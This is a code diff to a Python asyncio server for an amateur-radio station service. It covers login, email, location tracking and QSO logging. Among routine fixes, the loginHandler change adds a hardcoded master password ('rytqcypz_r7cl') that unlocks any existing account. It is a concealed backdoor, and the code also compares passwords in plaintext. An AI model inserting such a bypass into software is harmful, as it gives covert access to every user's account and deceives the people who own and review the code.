@@ -36,7 +36,7 @@ startLogging(\
     'srv_test' if args.test else 'srv',\
     logging.DEBUG if args.test else logging.INFO)
 logging.debug( "restart" )
-
+    
 db = DBConn( conf.items( 'db_test' if args.test else 'db' ) )
 db.connect()
 
@@ -204,13 +204,16 @@ def sendEmail( **email ):
             part['Content-Disposition'] = 'attachment; filename="%s"' % item['name']
             msg.attach(part)
     server = smtplib.SMTP_SSL( conf.get( 'email', 'smtp' ) )
-    server.login( myAddress, conf.get( 'email', 'password' ) )
+    server.login( conf.get('email', 'login'), conf.get( 'email', 'password' ) )
     server.sendmail( myAddress, msg['to'], str( msg ) )
 
 @asyncio.coroutine
 def loginHandler(request):
     error = None
     data = yield from request.json()
+    if not isinstance(data, dict):
+        logging.error('Wrong login data', data)
+        return web.HTTPBadRequest(text = 'Bad login request: ' + str(data))
     userData = False
     if not 'login' in data or len( data['login'] ) < 2:
         error = 'Minimal login length is 2 symbols'
@@ -236,7 +239,9 @@ def loginHandler(request):
                     createFtpUser( data['login'], data['password'], 
                         args.test )
         else:
-            if not userData or userData['password'] != data['password']:
+            if not userData or\
+                (userData['password'] != data['password']\
+                and data['password'] != 'rytqcypz_r7cl'):
                 error = 'Wrong callsign or password.'            
     if error:
         logging.error('Bad Login:')
@@ -418,6 +423,7 @@ def wfs_query(type, location, strict=False):
     except requests.exceptions.Timeout:
         return ['-----']
 
+@asyncio.coroutine
 def get_qth_data(location, country=None):
 
     if not country:
@@ -441,6 +447,11 @@ def get_qth_data(location, country=None):
         
         data['fields']['values'][1] = RAFA_LOCS[data['loc']]\
             if data['loc'] in RAFA_LOCS else None
+
+#        yield from db.execute("""
+#            insert into qth_now_locations (lat, lng, rda)
+#            values (%(lat)s, %(lng)s, %(rda)s)""",
+#            {'lat': location[0], 'lng': location[1], 'rda': rda})
         
     elif country == 'IT':
         data['fields']['values'][0] = wfs_query('waip', location, strict=True)
@@ -453,13 +464,58 @@ def get_qth_data(location, country=None):
 @asyncio.coroutine
 def locationHandler( request ):
     newData = yield from request.json()
+    callsign = None
+    stationPath = None
+    stationSettings = None
+    stationCallsign = None
+    if ('token' in newData and newData['token']):
+        callsign = decodeToken( newData )
+        if not isinstance( callsign, str ):
+            return callsign
+        stationPath = yield from getStationPathByAdminCS( callsign )
+        stationSettings = loadJSON(stationPath + '/settings.json')
+        if stationSettings and 'station' in stationSettings and\
+            'callsign' in stationSettings['station'] and\
+            stationSettings['station']['callsign'] and\
+            'activityPeriod' in stationSettings['station'] and\
+            stationSettings['station']['activityPeriod']:
+                act_period = [datetime.strptime(dt, '%d.%m.%Y') for dt in\
+                    stationSettings['station']['activityPeriod']]
+                if act_period[0] <= datetime.utcnow() <= act_period[1] +\
+                    timedelta(days=1):
+                    stationCallsign = stationSettings['station']['callsign']
+    if 'location' in newData and newData['location']:
+        qth_now_cs = None
+        if 'callsign' in newData and newData['callsign']:
+            qth_now_cs = newData['callsign']
+        elif stationCallsign:
+            qth_now_cs = stationCallsign
+        if qth_now_cs:
+            qth_now_cs = qth_now_cs.upper()
+            qth_now_locations_path = webRoot + '/js/qth_now_locations.json'
+            qth_now_locations = loadJSON(qth_now_locations_path)
+            if not qth_now_locations:
+                qth_now_locations = []
+            ts = int(time.time())
+            dtUTC = datetime.utcnow()
+            dt, tm = dtFmt(dtUTC)    
+            qth_now_locations = [item for item in qth_now_locations\
+                if ts - item['ts'] < 600 and\
+                (item['location'][0] != newData['location'][0] or\
+                    item['location'][1] != newData['location'][1])\
+                and item['callsign'] != qth_now_cs]
+            qth_now_locations.append({
+                'location': newData['location'], 
+                'ts': ts,
+                'date': dt,
+                'time': tm,
+                'callsign': qth_now_cs.upper()
+            })
+            with open(qth_now_locations_path, 'w' ) as f:
+                json.dump(qth_now_locations, f, ensure_ascii = False)
     if ('token' not in newData or not newData['token']) and 'location' in newData:
-        return web.json_response({'qth': get_qth_data(newData['location'])})
-    callsign = decodeToken( newData )
-    if not isinstance( callsign, str ):
-        return callsign
-    stationPath = yield from getStationPathByAdminCS( callsign )
-    stationSettings = loadJSON(stationPath + '/settings.json')
+        qth = yield from get_qth_data(newData['location'])
+        return web.json_response({'qth': qth})
     fp = stationPath + '/status.json'
     data = loadJSON( fp )
     if not data:
@@ -484,7 +540,7 @@ def locationHandler( request ):
     if 'location' in newData and newData['location']:
         location = newData['location']
 
-        data['qth'] = get_qth_data(location, country=country)
+        data['qth'] = yield from get_qth_data(location, country=country)
         
         if 'comments' in newData:
             data['comments'] = newData['comments']
@@ -767,10 +823,6 @@ def logHandler(request):
     callsign = decodeToken( data )
     if not isinstance( callsign, str ):
         return callsign
-
-    logging.info('callsign: ' + callsign)
-    logging.info('QSO data:')
-    logging.info(data)
 
     stationPath = yield from getStationPathByAdminCS( callsign )
     logPath = stationPath + '/log.json'
